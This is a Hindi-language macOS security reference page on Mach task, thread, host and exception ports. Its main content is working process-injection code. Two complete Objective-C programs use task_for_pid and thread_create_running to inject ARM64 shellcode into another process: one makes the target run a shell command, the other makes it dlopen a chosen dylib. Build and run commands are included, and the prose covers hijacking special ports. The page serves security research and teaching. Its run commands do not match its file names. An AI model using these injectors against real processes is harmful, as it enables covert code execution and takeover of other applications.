संख्या **8** से शुरू होने वाले पोर्ट **सिस्टम डेमन्स द्वारा स्वामित्व में हैं** और इन्हें [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html) में घोषित किया गया है।

- **होस्ट पोर्ट**: यदि किसी प्रक्रिया के पास इस पोर्ट पर **SEND** विशेषाधिकार है, तो वह इसकी रूटीन को कॉल करके **सिस्टम** के बारे में **जानकारी** प्राप्त कर सकती है जैसे:
- `host_processor_info`: प्रोसेसर जानकारी प्राप्त करें
- `host_info`: होस्ट जानकारी प्राप्त करें
- `host_virtual_physical_table_info`: वर्चुअल/फिजिकल पेज टेबल (MACH_VMDEBUG की आवश्यकता है)
- `host_statistics`: होस्ट सांख्यिकी प्राप्त करें
- `mach_memory_info`: कर्नेल मेमोरी लेआउट प्राप्त करें
- **होस्ट प्रिव पोर्ट**: इस पोर्ट पर **SEND** अधिकार वाली प्रक्रिया **विशेषाधिकार प्राप्त क्रियाएँ** कर सकती है जैसे बूट डेटा दिखाना या कर्नेल एक्सटेंशन लोड करने की कोशिश करना। इस अनुमति को प्राप्त करने के लिए **प्रक्रिया को रूट होना चाहिए**।
- इसके अलावा, **`kext_request`** API को कॉल करने के लिए अन्य अधिकारों की आवश्यकता होती है **`com.apple.private.kext*`** जो केवल Apple बाइनरी को दिए जाते हैं।
- अन्य रूटीन जो कॉल किए जा सकते हैं:
- `host_get_boot_info`: `machine_boot_info()` प्राप्त करें
- `host_priv_statistics`: विशेषाधिकार प्राप्त सांख्यिकी प्राप्त करें
- `vm_allocate_cpm`: सन्निहित भौतिक मेमोरी आवंटित करें
- `host_processors`: होस्ट प्रोसेसर को भेजें अधिकार
- `mach_vm_wire`: मेमोरी को निवासित बनाएं
- चूंकि **रूट** इस अनुमति को एक्सेस कर सकता है, यह `host_set_[special/exception]_port[s]` को कॉल करके **होस्ट विशेष या अपवाद पोर्ट्स को हाइजैक** कर सकता है।

यह संभव है कि **सभी होस्ट विशेष पोर्ट्स** को चलाकर देखा जा सके:
```bash
procexp all ports | grep "HSP"
```
### Task Special Ports

ये पोर्ट प्रसिद्ध सेवाओं के लिए आरक्षित हैं। इन्हें `task_[get/set]_special_port` कॉल करके प्राप्त/सेट किया जा सकता है। इन्हें `task_special_ports.h` में पाया जा सकता है:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
- **TASK_KERNEL_PORT**\[task-self send right]: इस कार्य को नियंत्रित करने के लिए उपयोग किया जाने वाला पोर्ट। इस कार्य को प्रभावित करने वाले संदेश भेजने के लिए उपयोग किया जाता है। यह **mach_task_self (नीचे कार्य पोर्ट देखें)** द्वारा लौटाया गया पोर्ट है।
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: कार्य का बूटस्ट्रैप पोर्ट। अन्य सिस्टम सेवा पोर्ट्स की वापसी के लिए संदेश भेजने के लिए उपयोग किया जाता है।
- **TASK_HOST_NAME_PORT**\[host-self send right]: समाहित होस्ट की जानकारी मांगने के लिए उपयोग किया जाने वाला पोर्ट। यह **mach_host_self** द्वारा लौटाया गया पोर्ट है।
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: वह पोर्ट जो इस कार्य के लिए वायर्ड कर्नेल मेमोरी का स्रोत नामित करता है।
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: वह पोर्ट जो इस कार्य के लिए डिफ़ॉल्ट मेमोरी प्रबंधित मेमोरी का स्रोत नामित करता है।

### कार्य पोर्ट

शुरुआत में Mach में "प्रक्रियाएँ" नहीं थीं, इसमें "कार्य" थे जो थ्रेड्स के कंटेनर के समान माने जाते थे। जब Mach को BSD के साथ जोड़ा गया, **तो प्रत्येक कार्य को एक BSD प्रक्रिया से संबंधित किया गया**। इसलिए हर BSD प्रक्रिया के पास वह विवरण होता है जिसकी उसे एक प्रक्रिया बनने के लिए आवश्यकता होती है और हर Mach कार्य के पास भी इसके आंतरिक कार्य होते हैं (सिवाय अस्तित्वहीन pid 0 के जो `kernel_task` है)।

इससे संबंधित दो बहुत दिलचस्प कार्य हैं:

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: निर्दिष्ट `pid` द्वारा संबंधित कार्य के कार्य पोर्ट के लिए एक SEND अधिकार प्राप्त करें और इसे निर्दिष्ट `target_task_port` (जो आमतौर पर वह कॉलर कार्य होता है जिसने `mach_task_self()` का उपयोग किया है, लेकिन यह एक अलग कार्य पर SEND पोर्ट भी हो सकता है) को दें।
- `pid_for_task(task, &pid)`: एक कार्य को SEND अधिकार दिया गया है, तो यह पता करें कि यह कार्य किस PID से संबंधित है।

कार्य के भीतर क्रियाएँ करने के लिए, कार्य को `mach_task_self()` को कॉल करके अपने लिए एक `SEND` अधिकार की आवश्यकता थी (जो `task_self_trap` (28) का उपयोग करता है)। इस अनुमति के साथ एक कार्य कई क्रियाएँ कर सकता है जैसे:

- `task_threads`: कार्य के थ्रेड्स के सभी कार्य पोर्ट्स पर SEND अधिकार प्राप्त करें
- `task_info`: एक कार्य के बारे में जानकारी प्राप्त करें
- `task_suspend/resume`: एक कार्य को निलंबित या फिर से शुरू करें
- `task_[get/set]_special_port`
- `thread_create`: एक थ्रेड बनाएं
- `task_[get/set]_state`: कार्य की स्थिति को नियंत्रित करें
- और अधिक जानकारी [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h) में पाई जा सकती है।

> [!CAUTION]
> ध्यान दें कि एक **अलग कार्य** के कार्य पोर्ट पर SEND अधिकार के साथ, एक अलग कार्य पर ऐसी क्रियाएँ करना संभव है।

इसके अलावा, task_port भी **`vm_map`** पोर्ट है जो एक कार्य के भीतर मेमोरी को **पढ़ने और हेरफेर करने** की अनुमति देता है जैसे कि `vm_read()` और `vm_write()`। इसका मतलब यह है कि एक कार्य जिसके पास एक अलग कार्य के task_port पर SEND अधिकार हैं, वह उस कार्य में **कोड इंजेक्ट** करने में सक्षम होगा।

याद रखें कि क्योंकि **कर्नेल भी एक कार्य है**, यदि कोई व्यक्ति **`kernel_task`** पर **SEND अनुमतियाँ** प्राप्त करने में सफल होता है, तो वह कर्नेल को कुछ भी निष्पादित करने के लिए मजबूर कर सकता है (जेलब्रेक)।

- कॉल करें `mach_task_self()` इस पोर्ट के लिए **नाम प्राप्त करने** के लिए कॉलर कार्य के लिए। यह पोर्ट केवल **`exec()`** के माध्यम से **विरासत में** लिया जाता है; `fork()` के साथ बनाए गए नए कार्य को एक नया कार्य पोर्ट मिलता है (एक विशेष मामले के रूप में, एक कार्य को `exec()` के बाद एक suid बाइनरी में भी एक नया कार्य पोर्ट मिलता है)। एक कार्य को उत्पन्न करने और इसके पोर्ट को प्राप्त करने का एकमात्र तरीका ["पोर्ट स्वैप डांस"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) करना है जबकि `fork()` कर रहे हैं।
- ये पोर्ट तक पहुँचने के लिए प्रतिबंध हैं (बाइनरी `AppleMobileFileIntegrity` से `macos_task_policy` से):
- यदि ऐप के पास **`com.apple.security.get-task-allow` अधिकार** हैं, तो **समान उपयोगकर्ता** के प्रक्रियाएँ कार्य पोर्ट तक पहुँच सकती हैं (आम तौर पर डिबगिंग के लिए Xcode द्वारा जोड़ा जाता है)। **नोटरीकरण** प्रक्रिया इसे उत्पादन रिलीज़ में अनुमति नहीं देगी।
- **`com.apple.system-task-ports`** अधिकार वाले ऐप्स किसी भी प्रक्रिया के लिए **कार्य पोर्ट प्राप्त कर सकते हैं**, सिवाय कर्नेल के। पुराने संस्करणों में इसे **`task_for_pid-allow`** कहा जाता था। यह केवल Apple अनुप्रयोगों को दिया जाता है।
- **रूट कार्य पोर्ट्स** तक पहुँच सकता है उन अनुप्रयोगों के **जो** एक **हर्डनड** रनटाइम के साथ संकलित नहीं हैं (और Apple से नहीं हैं)।

**कार्य नाम पोर्ट:** _कार्य पोर्ट_ का एक अप्रिविलेज्ड संस्करण। यह कार्य को संदर्भित करता है, लेकिन इसे नियंत्रित करने की अनुमति नहीं देता। इसके माध्यम से उपलब्ध एकमात्र चीज `task_info()` प्रतीत होती है।

### थ्रेड पोर्ट्स

थ्रेड्स के साथ भी संबंधित पोर्ट होते हैं, जो कार्य से **`task_threads`** को कॉल करने और प्रोसेसर से `processor_set_threads` से दिखाई देते हैं। थ्रेड पोर्ट पर SEND अधिकार `thread_act` उपप्रणाली से कार्यों का उपयोग करने की अनुमति देता है, जैसे:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

कोई भी थ्रेड इस पोर्ट को **`mach_thread_sef`** को कॉल करके प्राप्त कर सकता है।

### कार्य पोर्ट के माध्यम से थ्रेड में शेलकोड इंजेक्शन

आप एक शेलकोड प्राप्त कर सकते हैं:

{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**पार्श्विक** पिछले प्रोग्राम को संकलित करें और कोड इंजेक्ट करने के लिए **अधिकार** जोड़ें उसी उपयोगकर्ता के साथ (यदि नहीं, तो आपको **sudo** का उपयोग करना होगा)।

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> इसके लिए iOS पर काम करने के लिए आपको `dynamic-codesigning` अधिकार की आवश्यकता है ताकि आप एक लिखने योग्य मेमोरी निष्पादन योग्य बना सकें।

### कार्य पोर्ट के माध्यम से थ्रेड में Dylib इंजेक्शन

macOS में **थ्रेड्स** को **Mach** के माध्यम से या **posix `pthread` api** का उपयोग करके हेरफेर किया जा सकता है। पिछले इंजेक्शन में जो थ्रेड हमने उत्पन्न किया, वह Mach api का उपयोग करके उत्पन्न किया गया था, इसलिए **यह posix अनुपालन नहीं है**।

एक **सरल शेलकोड** को एक कमांड निष्पादित करने के लिए इंजेक्ट करना संभव था क्योंकि इसे **posix** अनुपालन वाले apis के साथ काम करने की आवश्यकता नहीं थी, केवल Mach के साथ। **अधिक जटिल इंजेक्शन** के लिए **थ्रेड** को भी **posix अनुपालन** होना चाहिए।

इसलिए, **थ्रेड को सुधारने** के लिए इसे **`pthread_create_from_mach_thread`** को कॉल करना चाहिए जो **एक मान्य pthread बनाएगा**। फिर, यह नया pthread **dlopen** को कॉल कर सकता है ताकि **सिस्टम से एक dylib लोड किया जा सके**, इसलिए विभिन्न क्रियाओं को करने के लिए नए शेलकोड को लिखने के बजाय कस्टम पुस्तकालयों को लोड करना संभव है।

आप **उदाहरण dylibs** पा सकते हैं (उदाहरण के लिए, वह जो एक लॉग उत्पन्न करता है और फिर आप इसे सुन सकते हैं):

{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### थ्रेड हाईजैकिंग द्वारा टास्क पोर्ट <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

इस तकनीक में प्रक्रिया का एक थ्रेड हाईजैक किया जाता है:

{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### टास्क पोर्ट इंजेक्शन डिटेक्शन

जब `task_for_pid` या `thread_create_*` को कॉल किया जाता है, तो यह कर्नेल से स्ट्रक्चर टास्क में एक काउंटर को बढ़ाता है जिसे यूजर मोड से `task_info(task, TASK_EXTMOD_INFO, ...)` कॉल करके एक्सेस किया जा सकता है।

## अपवाद पोर्ट

जब एक थ्रेड में कोई अपवाद होता है, तो यह अपवाद थ्रेड के निर्दिष्ट अपवाद पोर्ट पर भेजा जाता है। यदि थ्रेड इसे संभाल नहीं करता है, तो इसे टास्क अपवाद पोर्ट पर भेजा जाता है। यदि टास्क इसे संभाल नहीं करता है, तो इसे होस्ट पोर्ट पर भेजा जाता है जिसे launchd द्वारा प्रबंधित किया जाता है (जहां इसे स्वीकार किया जाएगा)। इसे अपवाद ट्रायेज कहा जाता है।

ध्यान दें कि अंत में, यदि इसे सही तरीके से संभाला नहीं गया, तो रिपोर्ट को ReportCrash डेमन द्वारा संभाला जाएगा। हालांकि, एक ही टास्क में दूसरे थ्रेड के लिए अपवाद को प्रबंधित करना संभव है, यही वह है जो क्रैश रिपोर्टिंग टूल जैसे `PLCreashReporter` करता है।

## अन्य ऑब्जेक्ट्स

### घड़ी

कोई भी उपयोगकर्ता घड़ी के बारे में जानकारी प्राप्त कर सकता है, हालांकि समय सेट करने या अन्य सेटिंग्स को संशोधित करने के लिए रूट होना आवश्यक है।

जानकारी प्राप्त करने के लिए `clock` सबसिस्टम से फ़ंक्शंस को कॉल करना संभव है जैसे: `clock_get_time`, `clock_get_attributtes` या `clock_alarm`\
मानों को संशोधित करने के लिए `clock_priv` सबसिस्टम का उपयोग किया जा सकता है जैसे `clock_set_time` और `clock_set_attributes` के साथ।

### प्रोसेसर और प्रोसेसर सेट

प्रोसेसर एपीआई एकल लॉजिकल प्रोसेसर को नियंत्रित करने की अनुमति देते हैं, फ़ंक्शंस को कॉल करके जैसे `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

इसके अलावा, **प्रोसेसर सेट** एपीआई कई प्रोसेसर को एक समूह में समूहित करने का एक तरीका प्रदान करते हैं। डिफ़ॉल्ट प्रोसेसर सेट को प्राप्त करने के लिए **`processor_set_default`** को कॉल करना संभव है।\
ये कुछ दिलचस्प एपीआई हैं जो प्रोसेसर सेट के साथ इंटरैक्ट करने के लिए हैं:

- `processor_set_statistics`
- `processor_set_tasks`: प्रोसेसर सेट के अंदर सभी कार्यों के लिए भेजने के अधिकारों का एक एरे लौटाता है
- `processor_set_threads`: प्रोसेसर सेट के अंदर सभी थ्रेड्स के लिए भेजने के अधिकारों का एक एरे लौटाता है
- `processor_set_stack_usage`
- `processor_set_info`

जैसा कि [**इस पोस्ट**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/) में उल्लेख किया गया है, अतीत में, यह पहले से उल्लेखित सुरक्षा को बायपास करने की अनुमति देता था ताकि अन्य प्रक्रियाओं में टास्क पोर्ट प्राप्त किए जा सकें और उन्हें **`processor_set_tasks`** को कॉल करके नियंत्रित किया जा सके और हर प्रक्रिया पर एक होस्ट पोर्ट प्राप्त किया जा सके।\
